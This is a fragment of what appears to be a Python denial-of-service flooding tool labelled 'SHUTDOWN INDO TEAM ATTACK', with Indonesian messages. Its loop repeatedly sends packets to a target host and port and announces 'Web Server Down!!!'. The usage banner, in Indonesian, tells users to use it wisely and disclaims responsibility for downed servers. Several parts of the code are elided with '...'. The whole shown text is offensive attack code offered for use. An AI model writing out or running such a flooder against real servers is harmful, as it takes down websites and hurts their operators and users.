	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				...
				s.shutdown(1)
				print("\033[91mshut===>Web Server Down!!!\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m[!]koneksi terputus kemungkinan website down!\033[0m")
...
def usage():
	print (''' \033[92m  	 SHUTDOWN INDO TEAM ATTACK
    ...
    pakai lah dengan bijak,kami tak bertanggung jawab atas down nya
    suatu server!
